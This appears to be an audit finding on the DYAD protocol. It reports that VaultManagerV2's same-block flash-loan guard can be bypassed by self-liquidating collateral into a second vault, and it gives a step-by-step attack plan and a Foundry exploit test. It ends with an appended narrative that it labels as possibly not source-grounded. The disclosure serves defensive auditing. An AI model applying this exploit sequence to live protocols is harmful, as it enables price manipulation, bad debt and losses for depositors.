---
id: 21139
severity: "High"
---

# Flash loan protection mechanism can be bypassed via self-liquidations

## Description

The protocol implements a flash-loan manipulation protection mechanism with the `idToBlockOfLastDeposit` variable. This values is set to the current block number during a deposit, and is checked during a withdrawal. If the system detects a deposit and withdrawal in the same block, the system reverts the transaction.
    
```solidity
    //function deposit
    idToBlockOfLastDeposit[id] = block.number;
    
    //function withdraw
    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
```

The issue is that there is another way to move funds around: liquidations. This calls the `move` function to transfer around the balances, and does not update the `idToBlockOfLastDeposit` of the receiving account.
    
```solidity
     function liquidate(
        uint id,
        uint to
      )
      {
        //...
        vault.move(id, to, collateral);
        //...
      }
```

So, a user can:

  1. Take out a flashloan. Deposit funds into a vault A. Mint dyad.
  2. Manipulate the price of kerosene to trigger a liquidation.
  3. Liquidate themselves and send their collateral to vault B.
  4. Withdraw from vault B in the same block.
  5. Pay off their flashloans.

The step 2 involves manipulating the price of kerosene, which affects their collateralization ratio. This has been discussed in a separate issue, and mainly states that if the user mints more dyad against free collateral in the system, or if any user takes out free collateral in the system, the price of kerosene will fall.

The flaw being discussed in this report is that the flash loan protection mechanism can be bypassed. This is different from the price manipulation issue and is thus a separate issue. Since this bypasses one of the primary safeguards in the system, this is a high severity issue.

## Proof of Concept

The POC exploit setup requires 4 accounts: A, B, C and D:

  * A is where the flashed funds will be deposited to.
  * B is where the liquidated funds will be deposited to.
  * C is for manipulating the kerosene price.
  * D is for minting dyad at manipulated price to accrue bad debt in the system.

Where:

A is used to **inflate** the price of kerosene.  
B is used to bypass the flash loan protection mechanism.  
C is used to **deflate** the price of kerosene.  
D is used to mint dyad at the **inflated** price, accruing bad debt in the system and damaging the protocol.

  1. Assume C has 1 million usdc tokens with `0` debt. C inflates the price of kerosene up by contributing to TVL, and will be used later to push the price down.
  2. Alice takes out a flashloan of 10 million usdc tokens. She deposits them in account A.
  3. Due to the sudden added **massive** flashloaned TVL, the internal price of kerosene shoots up.
  4. Alice uses account D to mint out dyad tokens at this condition. Alice can now mint out exactly as many dyad tokens as her exo collateral. This is allowed since the price of kerosene is inflated, which covers the collateralization ratio. Alice effectively has a CR of close to 1.0 but the system thinks it’s 1.5 due to kerosene being overvalued. The system is still solvent at this point.
  5. Alice buys kerosene from the market and adds it in account A and then mints dyad until account A has a CR of 1.5. The actual CR of A ignoring kerosene is close to 1.0.
  6. Alice now removes collateral from account C. This reduces the price of C, making Account A liquidatable.
  7. Alice now liquidates account A and sends the collateral to account B. This inflates the price of kerosene again since dyad supply has gone down, and she can repeat steps 5-6 multiple times since she can now mint more dyad tokens again.
  8. Alice gets a large portion of her flashed funds into account B. She withdraws them back out. This again drops the price of kerosene, allowing her to liquidate A more and recover more of her funds into account B.
  9. Alice pays back her flashloan.
  10. Account D is now left with a CR close to 1.0, since the price of kerosene has now gone back to normal. Any price fluctuations in the exo collateral will now lead to bad debt.

This lets Alice open positions at a CR of close to 1.0. This is very dangerous in a CDP protocol, since Alice’s risk is very low as she can sell off the minted dyad to recover her investment, but the protocol is now at a very risky position, close to accruing bad debt. Thus this is a high severity issue.

## Recommendation

The flashloan protection can be bypassed. MEV liquidation bots rely on flashloans to carryout liquidations, so there isn’t a very good way to prevent this attack vector. Making the price of kerosene less manipulatable is a good way to lower this attack chance. However, the system will still be open to flashloan deposits via liquidations.

Incorporating a mint fee will also help mitigate this vector, since the attacker will have a higher cost to manipulate the system.

This issue can be demonstrated through the following PoC:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {DeployBase, Contracts} from "../script/deploy/DeployBase.s.sol";
import {Parameters} from "../src/params/Parameters.sol";
import {DNft} from "../src/core/DNft.sol";
import {Dyad} from "../src/core/Dyad.sol";
import {Licenser} from "../src/core/Licenser.sol";
import {VaultManagerV2} from "../src/core/VaultManagerV2.sol";
import {Vault} from "../src/core/Vault.sol";
import {OracleMock} from "./OracleMock.sol";
import {ERC20Mock} from "./ERC20Mock.sol";
import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";

import {KerosineManager}        from "../src/core/KerosineManager.sol";
import {UnboundedKerosineVault} from "../src/core/Vault.kerosine.unbounded.sol";
import {BoundedKerosineVault}   from "../src/core/Vault.kerosine.bounded.sol";
import {Kerosine}               from "../src/staking/Kerosine.sol";
import {KerosineDenominator}    from "../src/staking/KerosineDenominator.sol";

contract VaultManagerV2Test is Test, Parameters {
  DNft         dNft;
  Licenser     vaultManagerLicenser;
  Licenser     vaultLicenser;
  Dyad         dyad;
  VaultManagerV2 vaultManagerV2;
 
  // weth
  Vault        wethVault;
  ERC20Mock    weth;
  OracleMock   wethOracle;

  //Kerosine
  Kerosine kerosine;
  UnboundedKerosineVault unboundedKerosineVault;

  KerosineManager        kerosineManager;
  KerosineDenominator    kerosineDenominator;
  
  //users
  address user1;
  address user2;

  function setUp() public {
    dNft       = new DNft();
    weth       = new ERC20Mock("WETH-TEST", "WETHT");
    wethOracle = new OracleMock(3000e8);

    vaultManagerLicenser = new Licenser();
    vaultLicenser        = new Licenser();

    dyad   = new Dyad(vaultManagerLicenser);

    //vault Manager V2
    vaultManagerV2    = new VaultManagerV2(
        dNft,
        dyad,
        vaultLicenser
      );

    //vault
       wethVault                   = new Vault(
        vaultManagerV2,
        ERC20(address(weth)),
        IAggregatorV3(address(wethOracle))
      );

    //kerosineManager
    kerosineManager = new KerosineManager();
    kerosineManager.add(address(wethVault));

    vaultManagerV2.setKeroseneManager(kerosineManager);

    //kerosine token
    kerosine = new Kerosine();
    //Unbounded KerosineVault
    unboundedKerosineVault = new UnboundedKerosineVault(
      vaultManagerV2,
      kerosine, 
      dyad,
      kerosineManager
    );
    

    //kerosineDenominator
    kerosineDenominator       = new KerosineDenominator(
      kerosine
    );
    unboundedKerosineVault.setDenominator(kerosineDenominator);

    //Licenser add vault
    vaultLicenser.add(address(wethVault));
    vaultLicenser.add(address(unboundedKerosineVault));

    //vaultManagerLicenser add manager
    vaultManagerLicenser.add(address(vaultManagerV2));

  }

  function testFlashLoanAttackUsingLiquidateSimulation() public{
      wethOracle.setPrice(1000e8);
      //1 The attacker prepares two NFTs ,some collateral and some Kerosene Token.
      uint id = mintDNft();
      uint id_for_liquidator = mintDNft();
      weth.mint(address(this), 1e18);

      //2 deposit all the non-Kerosene collateral in the vault with One NFT like id=1 
      vaultManagerV2.add(id_for_liquidator, address(wethVault));
      weth.approve(address(vaultManagerV2), 1e18);
      vaultManagerV2.deposit(id_for_liquidator, address(wethVault), 1e18);

      //3 In the next blocknumber, flashloan non-Kerosene collateral from Lending like Aave,
      vm.roll(block.number + 1);
      weth.mint(address(this), 1e18);//Simulation borrow 1 weth

      //deposit all the borrowed flashloan non-Kerosene collateral and Kerosene Token in the vault with One NFT like id=0
      vaultManagerV2.add(id, address(wethVault));
      weth.approve(address(vaultManagerV2), 1e18);
      vaultManagerV2.deposit(id, address(wethVault), 1e18);

      vaultManagerV2.addKerosene(id, address(unboundedKerosineVault));
      kerosine.approve(address(vaultManagerV2), 1000_000_000e18);
      vaultManagerV2.deposit(id, address(unboundedKerosineVault), 1000_000_000e18);

      //Mint the max number Dyad you can
      vaultManagerV2.mintDyad(id, 1000e18, address(this));
      uint256 cr = vaultManagerV2.collatRatio(id); //2e18
      assertEq(cr, 2e18);

      //withdraw using id_for_liquidator,  manipulate the  Kerosene price
      vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));
      cr = vaultManagerV2.collatRatio(id); //1e18
      assertEq(cr, 1e18);
      //liquidate
      vaultManagerV2.liquidate(id, id_for_liquidator);
      //withdraw the vault which is move from id  using id_for_liquidator
      vaultManagerV2.withdraw(id_for_liquidator, address(wethVault), 1e18, address(this));
      console.log("weth balance is ", weth.balanceOf(address(this))/1e18);
  }
  
  function mintDNft() public returns (uint) {
    return dNft.mintNft{value: 1 ether}(address(this));
  }

  function deposit(
    ERC20Mock token,
    uint      id,
    address   vault,
    uint      amount
  ) public {
    vaultManagerV2.add(id, vault);
    token.mint(address(this), amount);
    token.approve(address(vaultManagerV2), amount);
    vaultManagerV2.deposit(id, address(vault), amount);
  }

  receive() external payable {}

  function onERC721Received(
    address,
    address,
    uint256,
    bytes calldata
  ) external pure returns (bytes4) {
    return 0x150b7a02;
  }
}
```

For the impact: The sponsors stated quite clearly from the DYAD code4rena audit page that the main point of migrating from `vaultManagerV1` to `V2` is the need for a flashloan protection mechanism, and the impact of the bypass is the ability to manipulate kerosene price which could lead to mass liquidations as discussed in separate issues:

> Attack ideas (where to focus for bugs).  
> Manipulation of Kerosene Price.  
> Flash Loan attacks.   
> Migration.

> The goal is to migrate from `VaultManager` to `VaultManagerV2`. The main reason is the need for a flash loan protection which makes it harder to manipulate the deterministic Kerosene price.

After reading all the comments above, I believe this should be a valid high due to the following reasons:

  * Flash loan protection can be bypassed, since this didn’t exist in V1, it seems to me, it is a major change in V2.
  * Price manipulation impact is demonstrated above, which is caused by utilising Flash loans.
  * Flash loan attacks mentioned under Attack ideas of the audit page, obviously, the sponsor is interested in breaking this validation put in place.
  * Not a dup of [#67](https://github.com/code-423n4/2024-04-dyad-findings/issues/67)
    * 67’s attack is less accessible unlike with Flash loans where anyone can perform it. 
    * Furthermore, 67 isn’t necessarily to be performed as an attack, the event could occur naturally when whales intend to withdraw funds.

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-dyad-findings/issues/68)._

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a flash‑loan protection bypass that arises from the way the protocol records the block number of the last deposit for each vault identifier. When a user deposits collateral, the contract stores the current block number in a mapping and later checks that a withdrawal does not occur in the same block, reverting if the numbers match. However, the liquidation routine transfers collateral between vaults by calling an internal move function and does not update the stored block number for the receiving vault. An attacker can therefore take a flash loan, deposit the borrowed assets into a vault, manipulate the price of the kerosene token to make the vault under‑collateralised, trigger a self‑liquidation that moves the collateral to a second vault, and then withdraw the moved assets from the second vault in the same block. Because the block‑number guard was never refreshed during the liquidation, the withdrawal succeeds and the attacker can repay the flash loan while keeping any profit. This bypass allows the attacker to circumvent the primary safeguard intended to prevent same‑block deposit‑withdraw attacks, effectively creating a route to extract funds without triggering the intended revert. The issue manifests only when a liquidation that moves balances is performed in the same block as a deposit, and when the protocol relies on the kerosene price, which can be artificially inflated or deflated by the attacker, to affect collateralisation ratios. Users of the protocol, lenders, and the overall system are affected because the attack can generate bad debt, cause mass liquidations, and result in funds disappearing from the protocol’s treasury. The flaw was discovered during a security audit that examined the flash‑loan protection logic and identified that the liquidation path was not covered by the same‑block check. It is difficult to notice because the deposit‑withdraw invariant appears to be enforced, yet the indirect state change via liquidation is overlooked. The vulnerability belongs to the class of insufficient state‑update bugs where an invariant is enforced on one code path but not on another, allowing an attacker to bypass security checks. From a user perspective the protocol may appear to allow a normal withdrawal, but the expectation that flash‑loan deposits cannot be withdrawn in the same block is violated, leading to unexpected profit for the attacker and loss for honest participants. To remediate the issue the contract should update the last‑deposit block number whenever collateral is moved, including during liquidations, or extend the same‑block protection to cover liquidation‑induced transfers. Additional mitigations such as reducing the manipulability of the kerosine price, introducing a mint fee, or redesigning the flash‑loan guard to consider all balance‑changing functions can also close the bypass.
